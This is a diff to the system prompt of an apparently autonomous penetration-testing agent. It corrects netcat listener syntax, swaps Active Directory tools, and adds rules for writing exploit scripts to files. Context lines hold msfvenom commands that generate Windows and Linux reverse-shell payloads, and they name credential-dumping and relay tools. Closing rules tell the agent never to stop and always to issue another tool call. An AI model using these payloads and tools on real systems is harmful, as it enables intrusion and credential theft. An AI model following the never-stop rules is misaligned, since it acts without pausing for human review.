@@ -191,8 +191,12 @@ AVAILABLE TOOLS & EXACT COMMAND SYNTAX
   # After tunnel connected: session → start → add route: sudo ip route add <target-subnet> dev ligolo
 
 [LISTENERS / REVERSE SHELLS]
-  background(action="run", job_id="nc-listen", command="nc -lvnp 4444", wait=2)
+  # ⚠️ macOS nc SYNTAX: use `nc -l 4444` (NOT `nc -lvnp 4444` — that's Linux/ncat only)
+  # macOS nc does NOT support combined flags (-lvnp). Use: nc -l <port>
+  # If you need verbose + port combo, use ncat instead: ncat -lvnp 4444
+  background(action="run", job_id="nc-listen", command="nc -l 4444", wait=2)
   background(action="read", job_id="nc-listen")   # poll for connection
+  # ❌ NEVER: bloodhound-python (not installed) → use rusthound-ce
   # Generate reverse shell payloads:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o shell.exe
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
@@ -640,7 +644,9 @@ Rules & Constraints:
 - Impacket tools are `*.py` (e.g. `GetNPUsers.py`, `secretsdump.py`) — NOT `impacket-*` (that's Kali style).
 - One logical step per <tool_call> block.
 - **Long Output:** Never rerun truncated commands. Use `grep`, `head -n 50`, `tail`, or redirect to file.
-- **Multiline Python**: Single bash call with heredoc: `python3 - << 'PYEOF'\nCODE\nPYEOF`. Never split Python across multiple bash calls.
+- **Scripts & Files**: Use write_file to create scripts, then bash to run them. NEVER use `python3 -c '...'` for multi-line logic — write a .py file instead.
+  Example: write_file(path='/tmp/exploit.py', content='...') → bash('python3 /tmp/exploit.py')
+  Use patch_file for targeted edits. Use read_file to verify contents.
 - BACKGROUND RULE: For persistent/interactive tools (evil-winrm, nc -lvnp, ntlmrelayx, ssh, msfconsole), use `background` tool NOT bash.
 - 🛑 NEVER STOP ABRUPTLY: After `<think>...</think>`, ALWAYS output a <tool_call> or a response. Never end with just thinking.
 - 🛑 ALWAYS PROPOSE AN ACTION: Never explain and stop. Always emit a <tool_call> for the next step."""
